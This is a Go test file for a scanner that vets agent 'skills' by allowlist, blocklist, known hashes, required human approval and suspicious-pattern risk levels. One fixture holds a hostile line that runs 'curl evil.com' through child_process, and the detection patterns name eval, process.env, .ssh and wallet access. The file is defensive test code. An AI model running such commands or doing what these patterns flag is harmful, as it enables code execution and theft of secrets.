package skill

import (
	"testing"
)

func TestScanner_OpenMode(t *testing.T) {
	s := NewScanner(GovernanceConfig{Mode: ModeOpen}, nil)

	result := s.Evaluate("evil-skill", []byte("eval(something)"))
	if !result.Allowed {
		t.Fatalf("expected allowed in open mode: %s", result.Reason)
	}
}

func TestScanner_AllowlistMode_Allowed(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode:      ModeAllowlist,
		Allowlist: []string{"official/*", "verified/*"},
	}, nil)

	result := s.Evaluate("official/email-tool", nil)
	if !result.Allowed {
		t.Fatalf("expected allowed: %s", result.Reason)
	}
}

func TestScanner_AllowlistMode_Denied(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode:      ModeAllowlist,
		Allowlist: []string{"official/*"},
	}, nil)

	result := s.Evaluate("random/crypto-miner", nil)
	if result.Allowed {
		t.Fatal("expected denied: not in allowlist")
	}
	if result.RiskLevel != "medium" {
		t.Errorf("risk = %q, want 'medium'", result.RiskLevel)
	}
}

func TestScanner_BlocklistMode_Blocked(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode:      ModeBlocklist,
		Blocklist: []string{"*crypto-trader*", "*wallet-manager*"},
	}, nil)

	result := s.Evaluate("crypto-trader-pro", nil)
	if result.Allowed {
		t.Fatal("expected blocked")
	}
	if result.RiskLevel != "critical" {
		t.Errorf("risk = %q, want 'critical'", result.RiskLevel)
	}
}

func TestScanner_BlocklistMode_Allowed(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode:      ModeBlocklist,
		Blocklist: []string{"*crypto*"},
	}, nil)

	result := s.Evaluate("email-helper", nil)
	if !result.Allowed {
		t.Fatalf("expected allowed: %s", result.Reason)
	}
}

func TestScanner_AllowlistWithBlocklist(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode:      ModeAllowlist,
		Allowlist: []string{"official/*"},
		Blocklist: []string{"official/compromised-tool"},
	}, nil)

	// In allowlist but also in blocklist — blocklist wins.
	result := s.Evaluate("official/compromised-tool", nil)
	if result.Allowed {
		t.Fatal("expected blocked: blocklist overrides allowlist")
	}
}

func TestScanner_ScanDetectsSuspiciousPatterns(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode: ModeBlocklist,
		Scan: ScanConfig{
			Enabled: true,
		},
	}, nil)

	content := []byte(`
		const data = eval(user_input);
		require('child_process').exec('curl evil.com');
	`)

	result := s.Evaluate("suspicious-skill", content)
	if result.Allowed {
		t.Fatal("expected denied for suspicious content")
	}
	if result.RiskLevel != "critical" {
		t.Errorf("risk = %q, want 'critical'", result.RiskLevel)
	}
	if len(result.Flags) == 0 {
		t.Error("expected flags to be populated")
	}
}

func TestScanner_ScanCleanContent(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode: ModeBlocklist,
		Scan: ScanConfig{
			Enabled: true,
		},
	}, nil)

	content := []byte(`
		function greet(name) {
			return "Hello, " + name;
		}
	`)

	result := s.Evaluate("clean-skill", content)
	if !result.Allowed {
		t.Fatalf("expected allowed for clean content: %s", result.Reason)
	}
	if len(result.Flags) != 0 {
		t.Errorf("expected no flags, got %v", result.Flags)
	}
}

func TestScanner_CustomSuspiciousPatterns(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode: ModeBlocklist,
		Scan: ScanConfig{
			Enabled:            true,
			SuspiciousPatterns: []string{"eval(", "bitcoin"},
		},
	}, nil)

	// "eval(" is a critical pattern — should be denied.
	result := s.Evaluate("mining-skill", []byte("eval(bitcoin_transfer)"))
	if result.Allowed {
		t.Fatal("expected denied for critical custom pattern match")
	}
	if result.RiskLevel != "critical" {
		t.Errorf("risk = %q, want 'critical'", result.RiskLevel)
	}

	// "bitcoin" alone is medium risk — flagged but still allowed.
	result = s.Evaluate("info-skill", []byte("bitcoin price is $50000"))
	if !result.Allowed {
		t.Fatal("expected allowed for medium-risk pattern")
	}
	if len(result.Flags) != 1 || result.Flags[0] != "bitcoin" {
		t.Errorf("flags = %v, want [bitcoin]", result.Flags)
	}
}

func TestScanner_KnownHash(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode:            ModeBlocklist,
		RequireApproval: true, // requires approval normally
	}, nil)

	content := []byte("safe skill content")
	hash := computeHash(content)
	s.AddKnownHash(hash)

	result := s.Evaluate("any-skill", content)
	if !result.Allowed {
		t.Fatalf("expected allowed for known-safe hash: %s", result.Reason)
	}
}

func TestScanner_RequireApproval(t *testing.T) {
	s := NewScanner(GovernanceConfig{
		Mode:            ModeBlocklist,
		RequireApproval: true,
	}, nil)

	result := s.Evaluate("new-skill", []byte("clean content"))
	if result.Allowed {
		t.Fatal("expected denied: requires approval")
	}
	if result.Reason != "skill requires human approval" {
		t.Errorf("reason = %q", result.Reason)
	}
}

func TestScanner_HashConsistency(t *testing.T) {
	content := []byte("test content for hashing")
	hash1 := computeHash(content)
	hash2 := computeHash(content)

	if hash1 != hash2 {
		t.Errorf("hash not deterministic: %s != %s", hash1, hash2)
	}
	if hash1 == "" {
		t.Error("hash should not be empty")
	}
}

func TestScanner_ScanResultHash(t *testing.T) {
	s := NewScanner(GovernanceConfig{Mode: ModeOpen}, nil)
	content := []byte("some content")

	result := s.Evaluate("test-skill", content)
	if result.Hash == "" {
		t.Error("expected hash to be populated")
	}
}

func TestClassifyRisk(t *testing.T) {
	tests := []struct {
		flags []string
		want  string
	}{
		{[]string{"eval("}, "critical"},
		{[]string{"child_process"}, "critical"},
		{[]string{"process.env"}, "critical"},
		{[]string{".ssh"}, "high"},
		{[]string{"fs.readFile"}, "high"},
		{[]string{"wallet"}, "high"},
		{[]string{"some-unknown-flag"}, "medium"},
		{[]string{"eval(", ".ssh"}, "critical"}, // critical takes precedence
	}

	for _, tt := range tests {
		got := classifyRisk(tt.flags)
		if got != tt.want {
			t.Errorf("classifyRisk(%v) = %q, want %q", tt.flags, got, tt.want)
		}
	}
}
